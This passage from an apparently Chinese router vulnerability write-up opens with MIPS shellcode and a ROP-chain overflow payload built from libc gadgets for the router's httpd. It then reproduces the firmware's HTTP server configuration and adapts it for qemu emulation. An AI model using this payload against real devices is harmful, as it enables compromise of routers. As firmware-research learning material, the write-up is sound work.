+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xfc\xff\xa0\xaf</span><span class="s2">"</span>  <span class="c1"># sw $zero, -4($sp)</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xf4\xff\xa4\x27</span><span class="s2">"</span>  <span class="c1"># addiu $a0, $sp, -0xc</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xff\xff\x05\x28</span><span class="s2">"</span>  <span class="c1"># slti $a1, $zero, -1</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\xab\x0f\x02\x24</span><span class="s2">"</span>  <span class="c1"># addiu;$v0, $zero, 0xfab</span>
+<span class="n">shellcode</span> <span class="o">+=</span> <span class="s2">"</span><span class="se">\x0c\x01\x01\x01</span><span class="s2">"</span>  <span class="c1"># syscall 0x40404</span>
+
+<span class="n">payload</span> <span class="o">=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mh">0x3cd</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s0</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget2</span><span class="p">)</span>       <span class="c1"># s1 = mipsrop.tail() &amp;&amp; move $ra,$(sp+0x24) &amp;&amp; jr s2</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">sleep</span><span class="p">)</span>         <span class="c1"># s2 = jr $(sp+0x24)</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s3</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget4</span><span class="p">)</span>       <span class="c1"># s4 = mipsrop.find("move $t9,$s1") &amp;&amp; jr shellcode</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s5</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s6</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># s7</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'A'</span> <span class="o">*</span> <span class="mi">4</span>                        <span class="c1"># fp</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget1</span><span class="p">)</span>       <span class="c1"># fisrt_ra = mipsrop.find("li $a0,1") &amp;&amp; jr s1</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'B'</span> <span class="o">*</span> <span class="mh">0x24</span> <span class="c1"># mipsrop.tail() 0x24B padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">libc_base</span> <span class="o">+</span> <span class="n">gadget3</span><span class="p">)</span>       <span class="c1"># $(sp+0x24) = mipsrop.stackfinder() &amp;&amp; move s1,$(sp+0x18) &amp;&amp; jr $s4</span>
+
+<span class="n">payload</span> <span class="o">+=</span> <span class="s1">'c'</span> <span class="o">*</span> <span class="mh">0x18</span> <span class="c1"># mipsrop.stackfinder() 0x18B padding</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
+</pre></div>
+<p>调试结果显示能够进入到Shellcode去执行。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094336-a4627868-a53b-1.png"/></p>
+<p>但是之后一直出不去，获取不到shell。</p>
+<p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20200603094337-a4b77e44-a53b-1.png"/></p>
+<p>所以到目前为止，利用qemu用户模式还没有成功获取shell！！！</p>
+<h2 data-content="1" id="7f3e0020cbc5928ee127df84cf9db9f6">利用qemu-system-mipsel调试</h2>
+<p>我们这里主要是为了在qemu虚拟机中重现http服务。通过查看文件系统中的<code>/bin、/sbin、/usr/bin、/usr/sbin</code>可以知道<code>/sbin/httpd</code>应该是用于监听web端口的http服务，同时查看<code>/htdocs/web</code>文件夹下的cgi文件和php文件，可以了解到接受到的数据通过php+cgi来处理并返回客户端。</p>
+<h3 data-content="1" id="b2f91345021c0182adbad169522e7a88">环境配置</h3>
+<p><code>find ./ -name '*http*'</code>找到web配置文件httpcfg.php。</p>
+<div class="highlight"><pre><span></span>./etc/services/HTTP/httpcfg.php
+./etc/services/HTTP/httpsvcs.php
+./usr/sbin/httpc
+./sbin/httpd
+</pre></div>
+<p>查看httpcf.php</p>
+<div class="highlight"><pre><span></span><span class="x">Umask 026</span>
+<span class="x">PIDFile /var/run/httpd.pid</span>
+<span class="x">#LogGMT On</span>
+<span class="x">#ErrorLog /dev/console</span>
+
+<span class="x">Tuning</span>
+<span class="x">{</span>
+<span class="x">    NumConnections 15</span>
+<span class="x">    BufSize 12288</span>
+<span class="x">    InputBufSize 4096</span>
+<span class="x">    ScriptBufSize 4096</span>
+<span class="x">    NumHeaders 100</span>
+<span class="x">    Timeout 60</span>
+<span class="x">    ScriptTimeout 60</span>
+<span class="x">}</span>
+
+<span class="x">Control</span>
+<span class="x">{</span>
+<span class="x">    Types</span>
+<span class="x">    {</span>
+<span class="x">        text/html   { html htm }</span>
+<span class="x">        text/xml    { xml }</span>
+<span class="x">        text/plain  { txt }</span>
+<span class="x">        image/gif   { gif }</span>
+<span class="x">        image/jpeg  { jpg }</span>
+<span class="x">        text/css    { css }</span>
+<span class="x">        application/octet-stream { * }</span>
+<span class="x">    }</span>
+<span class="x">    Specials</span>
+<span class="x">    {</span>
+<span class="x">        Dump        { /dump }</span>
+<span class="x">        CGI         { cgi }</span>
+<span class="x">        Imagemap    { map }</span>
+<span class="x">        Redirect    { url }</span>
+<span class="x">    }</span>
+<span class="x">    External</span>
+<span class="x">    {</span>
+<span class="x">        /usr/sbin/phpcgi { php }</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+
+<span class="cp">&lt;?</span>
+<span class="k">include</span> <span class="s2">"/htdocs/phplib/phyinf.php"</span><span class="p">;</span>
+
+<span class="k">function</span> <span class="nf">http_server</span><span class="p">(</span><span class="nv">$sname</span><span class="p">,</span> <span class="nv">$uid</span><span class="p">,</span> <span class="nv">$ifname</span><span class="p">,</span> <span class="nv">$af</span><span class="p">,</span> <span class="nv">$ipaddr</span><span class="p">,</span> <span class="nv">$port</span><span class="p">,</span> <span class="nv">$hnap</span><span class="p">,</span> <span class="nv">$widget</span><span class="p">,</span> <span class="nv">$smart404</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">echo</span>
+        <span class="s2">"Server"</span><span class="o">.</span>                                   <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"{"</span><span class="o">.</span>                                        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   ServerName </span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$sname</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span>             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   ServerId </span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span>                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Family "</span><span class="o">.</span><span class="nv">$af</span><span class="o">.</span>                       <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Interface "</span><span class="o">.</span><span class="nv">$ifname</span><span class="o">.</span>                    <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Address "</span><span class="o">.</span><span class="nv">$ipaddr</span><span class="o">.</span>                  <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Port "</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Virtual"</span><span class="o">.</span>                               <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   {"</span><span class="o">.</span>                                     <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       AnyHost"</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       Control"</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       {"</span><span class="o">.</span>                                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           Alias /"</span><span class="o">.</span>                       <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           Location /htdocs/web"</span><span class="o">.</span>          <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           IndexNames { index.php }"</span><span class="o">.</span>      <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="o">==</span><span class="s2">"LAN-1"</span><span class="o">||</span><span class="nv">$uid</span><span class="o">==</span><span class="s2">"WAN-1"</span><span class="p">)</span>   <span class="k">echo</span>
+        <span class="s2">"           External"</span><span class="o">.</span>                      <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           {"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"               /usr/sbin/phpcgi { txt }"</span><span class="o">.</span>  <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           }"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$widget</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>    <span class="k">echo</span>
+        <span class="s2">"           External"</span><span class="o">.</span>                      <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           {"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"               /usr/sbin/phpcgi { router_info.xml }"</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"               /usr/sbin/phpcgi { post_login.xml }"</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           }"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>   
+    <span class="k">echo</span>
+        <span class="s2">"       }"</span><span class="o">.</span>                                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$smart404</span> <span class="o">!=</span> <span class="s2">""</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span>
+        <span class="s1">'       Control'</span><span class="o">.</span>                           <span class="s1">'\n'</span><span class="o">.</span>
+        <span class="s1">'       {'</span><span class="o">.</span>                                 <span class="s1">'\n'</span><span class="o">.</span>
+        <span class="s1">'           Alias /smart404'</span><span class="o">.</span>               <span class="s1">'\n'</span><span class="o">.</span>
+        <span class="s1">'           Location /htdocs/smart404'</span><span class="o">.</span>     <span class="s1">'\n'</span><span class="o">.</span>
+        <span class="s1">'       }'</span><span class="o">.</span>                                 <span class="s1">'\n'</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$hnap</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">echo</span>
+        <span class="s2">"       Control"</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       {"</span><span class="o">.</span>                                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           Alias /HNAP1"</span><span class="o">.</span>                  <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           Location /htdocs/HNAP1"</span><span class="o">.</span>        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           External"</span><span class="o">.</span>                      <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           {"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"               /usr/sbin/hnap { hnap }"</span><span class="o">.</span>   <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           }"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           IndexNames { index.hnap }"</span><span class="o">.</span>     <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       }"</span><span class="o">.</span>                                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+    <span class="p">}</span>
+    <span class="k">echo</span>
+        <span class="s2">"   }"</span><span class="o">.</span>                                     <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"}"</span><span class="o">.</span>                                        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">ssdp_server</span><span class="p">(</span><span class="nv">$sname</span><span class="p">,</span> <span class="nv">$uid</span><span class="p">,</span> <span class="nv">$ifname</span><span class="p">,</span> <span class="nv">$af</span><span class="p">,</span> <span class="nv">$ipaddr</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$af</span><span class="o">==</span><span class="s2">"inet6"</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+    <span class="k">echo</span>
+        <span class="s2">"Server"</span><span class="o">.</span>                                   <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"{"</span><span class="o">.</span>                                        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   ServerName </span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$sname</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span>             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   ServerId </span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span>                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Family "</span><span class="o">.</span><span class="nv">$af</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Interface "</span><span class="o">.</span><span class="nv">$ifname</span><span class="o">.</span>                    <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Port 1900"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Address 239.255.255.250"</span><span class="o">.</span>               <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Datagrams On"</span><span class="o">.</span>                          <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Virtual"</span><span class="o">.</span>                               <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   {"</span><span class="o">.</span>                                     <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       AnyHost"</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       Control"</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       {"</span><span class="o">.</span>                                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           Alias /"</span><span class="o">.</span>                       <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           Location /htdocs/upnp/docs/"</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           External"</span><span class="o">.</span>                      <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           {"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"               /htdocs/upnp/ssdpcgi { * }"</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           }"</span><span class="o">.</span>                             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       }"</span><span class="o">.</span>                                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   }"</span><span class="o">.</span>                                     <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"}"</span><span class="o">.</span>                                        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">upnp_server</span><span class="p">(</span><span class="nv">$sname</span><span class="p">,</span> <span class="nv">$uid</span><span class="p">,</span> <span class="nv">$ifname</span><span class="p">,</span> <span class="nv">$af</span><span class="p">,</span> <span class="nv">$ipaddr</span><span class="p">,</span> <span class="nv">$port</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$af</span><span class="o">==</span><span class="s2">"inet6"</span><span class="p">)</span> <span class="k">return</span><span class="p">;</span>
+    <span class="k">echo</span>
+        <span class="s2">"Server"</span><span class="o">.</span>                                   <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"{"</span><span class="o">.</span>                                        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   ServerName </span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$sname</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span>             <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   ServerId </span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s2">"</span><span class="se">\"</span><span class="s2">"</span><span class="o">.</span>                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Family "</span><span class="o">.</span><span class="nv">$af</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Interface "</span><span class="o">.</span><span class="nv">$ifname</span><span class="o">.</span>                    <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Address "</span><span class="o">.</span><span class="nv">$ipaddr</span><span class="o">.</span>                  <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Port "</span><span class="o">.</span><span class="nv">$port</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   Virtual"</span><span class="o">.</span>                               <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   {"</span><span class="o">.</span>                                     <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       AnyHost"</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       Control"</span><span class="o">.</span>                           <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       {"</span><span class="o">.</span>                                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           Alias /"</span><span class="o">.</span>                       <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"           Location /htdocs/upnp/docs/"</span><span class="o">.</span><span class="nv">$uid</span><span class="o">.</span><span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"       }"</span><span class="o">.</span>                                 <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"   }"</span><span class="o">.</span>                                     <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"}"</span><span class="o">.</span>                                        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="o">.</span>
+        <span class="s2">"</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">foreach</span><span class="p">(</span><span class="s2">"/runtime/services/http/server"</span><span class="p">)</span>
+<span class="p">{</span>
+    <span class="nv">$model</span>  <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"/runtime/device/modelname"</span><span class="p">);</span>
+    <span class="nv">$ver</span>    <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"/runtime/device/firmwareversion"</span><span class="p">);</span>
+    <span class="nv">$smart404</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"/runtime/smart404"</span><span class="p">);</span>
+    <span class="nv">$sname</span>  <span class="o">=</span> <span class="s2">"Linux, HTTP/1.1, "</span><span class="o">.</span><span class="nv">$model</span><span class="o">.</span><span class="s2">" Ver "</span><span class="o">.</span><span class="nv">$ver</span><span class="p">;</span>  <span class="cm">/* HTTP server name */</span>
+    <span class="nv">$suname</span> <span class="o">=</span> <span class="s2">"Linux, UPnP/1.0, "</span><span class="o">.</span><span class="nv">$model</span><span class="o">.</span><span class="s2">" Ver "</span><span class="o">.</span><span class="nv">$ver</span><span class="p">;</span>  <span class="cm">/* UPnP server name */</span>
+    <span class="nv">$mode</span>   <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"mode"</span><span class="p">);</span>
+    <span class="nv">$inf</span>    <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"inf"</span><span class="p">);</span>
+    <span class="nv">$ifname</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"ifname"</span><span class="p">);</span>
+    <span class="nv">$ipaddr</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"ipaddr"</span><span class="p">);</span>
+    <span class="nv">$port</span>   <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"port"</span><span class="p">);</span>
+    <span class="nv">$hnap</span>   <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"hnap"</span><span class="p">);</span>
+    <span class="nv">$widget</span> <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"widget"</span><span class="p">);</span>
+    <span class="nv">$af</span>     <span class="o">=</span> <span class="nx">query</span><span class="p">(</span><span class="s2">"af"</span><span class="p">);</span>
+
+
+    <span class="k">if</span> <span class="p">(</span><span class="nv">$af</span><span class="o">!=</span><span class="s2">""</span> <span class="o">&amp;&amp;</span> <span class="nv">$ifname</span><span class="o">!=</span><span class="s2">""</span><span class="p">)</span>
+    <span class="p">{</span>
+        <span class="k">if</span>      <span class="p">(</span><span class="nv">$mode</span><span class="o">==</span><span class="s2">"HTTP"</span><span class="p">)</span> <span class="nx">http_server</span><span class="p">(</span><span class="nv">$sname</span><span class="p">,</span> <span class="nv">$inf</span><span class="p">,</span><span class="nv">$ifname</span><span class="p">,</span><span class="nv">$af</span><span class="p">,</span><span class="nv">$ipaddr</span><span class="p">,</span><span class="nv">$port</span><span class="p">,</span><span class="nv">$hnap</span><span class="p">,</span><span class="nv">$widget</span><span class="p">,</span><span class="nv">$smart404</span><span class="p">);</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span><span class="o">==</span><span class="s2">"SSDP"</span><span class="p">)</span> <span class="nx">ssdp_server</span><span class="p">(</span><span class="nv">$sname</span><span class="p">,</span> <span class="nv">$inf</span><span class="p">,</span><span class="nv">$ifname</span><span class="p">,</span><span class="nv">$af</span><span class="p">,</span><span class="nv">$ipaddr</span><span class="p">);</span>
+        <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$mode</span><span class="o">==</span><span class="s2">"UPNP"</span><span class="p">)</span> <span class="nx">upnp_server</span><span class="p">(</span><span class="nv">$suname</span><span class="p">,</span><span class="nv">$inf</span><span class="p">,</span><span class="nv">$ifname</span><span class="p">,</span><span class="nv">$af</span><span class="p">,</span><span class="nv">$ipaddr</span><span class="p">,</span><span class="nv">$port</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+
+<span class="cp">?&gt;</span><span class="x"></span>
+</pre></div>
+<p>可以了解到该php用于生成配置文件，由于我们只需要其中的http服务，可以按照该配置文件改写我们所需的conf。</p>
+<div class="highlight"><pre><span></span><span class="x">Umask 026</span>
+<span class="x">PIDFile /var/run/httpd.pid</span>
+<span class="x">LogGMT On  #开启log</span>
+<span class="x">ErrorLog /log #log文件</span>
+
+<span class="x">Tuning</span>
+<span class="x">{</span>
+<span class="x">    NumConnections 15</span>
+<span class="x">    BufSize 12288</span>
+<span class="x">    InputBufSize 4096</span>
+<span class="x">    ScriptBufSize 4096</span>
+<span class="x">    NumHeaders 100</span>
+<span class="x">    Timeout 60</span>
+<span class="x">    ScriptTimeout 60</span>
+<span class="x">}</span>
+
+<span class="x">Control</span>
+<span class="x">{</span>
+<span class="x">    Types</span>
+<span class="x">    {</span>
+<span class="x">        text/html    { html htm }</span>
+<span class="x">        text/xml    { xml }</span>
+<span class="x">        text/plain    { txt }</span>
+<span class="x">        image/gif    { gif }</span>
+<span class="x">        image/jpeg    { jpg }</span>
+<span class="x">        text/css    { css }</span>
+<span class="x">        application/octet-stream { * }</span>
+<span class="x">    }</span>
+<span class="x">    Specials</span>
+<span class="x">    {</span>
+<span class="x">        Dump        { /dump }</span>
+<span class="x">        CGI            { cgi }</span>
+<span class="x">        Imagemap    { map }</span>
+<span class="x">        Redirect    { url }</span>
+<span class="x">    }</span>
+<span class="x">    External</span>
+<span class="x">    {</span>
+<span class="x">        /usr/sbin/phpcgi { php }</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+
+
+<span class="x">Server</span>
+<span class="x">{</span>
+<span class="x">    ServerName "Linux, HTTP/1.1, "</span>
+<span class="x">    ServerId "1234"</span>
+<span class="x">    Family inet</span>
+<span class="x">    Interface eth0 #对应qemu虚拟机的网卡</span>
+<span class="x">    Address 192.168.79.143 #对于qemu虚拟机IP</span>
+<span class="x">    Port "1234" #对应未被使用的端口</span>
+<span class="x">    Virtual</span>
+<span class="x">    {</span>
+<span class="x">        AnyHost</span>
+<span class="x">        Control</span>
+<span class="x">        {</span>
+<span class="x">            Alias /</span>
+<span class="x">            Location /htdocs/web</span>
+<span class="x">            IndexNames { index.php }</span>
+<span class="x">            External</span>
+<span class="x">            {</span>
+<span class="x">                /usr/sbin/phpcgi { router_info.xml }</span>
+<span class="x">                /usr/sbin/phpcgi { post_login.xml }</span>
+<span class="x">            }</span>
+<span class="x">        }</span>
+<span class="x">        Control</span>
+<span class="x">        {</span>
+<span class="x">            Alias /HNAP1</span>
+<span class="x">            Location /htdocs/HNAP1</span>
+<span class="x">            External</span>
+<span class="x">            {</span>
+<span class="x">                /usr/sbin/hnap { hnap }</span>
+<span class="x">            }</span>
+<span class="x">            IndexNames { index.hnap }</span>
+<span class="x">        }</span>
+<span class="x">    }</span>
+<span class="x">}</span>
+</pre></div>
+<p>接下来利用qemu系统模式仿真路由器的运行环境，具体的配置过程在之前的<a href="https://pup2y.github.io/2020/03/30/lu-you-qi-lou-dong-wa-jue-huan-jing-da-jian/" target="_blank">路由器漏洞挖掘环境搭建</a>。</p>
+<p>利用下面命令启动，接下来的实验是一次性实验，因为会覆盖qemu虚拟机原本文件系统中的/etc等文件夹从而损坏原有配置，所以无法第二次启动。同时需要注意选择的内核应该是vmlinux-3.2.0-4-4kc-malta，版本太低与我所有gdbserver不匹配。</p>
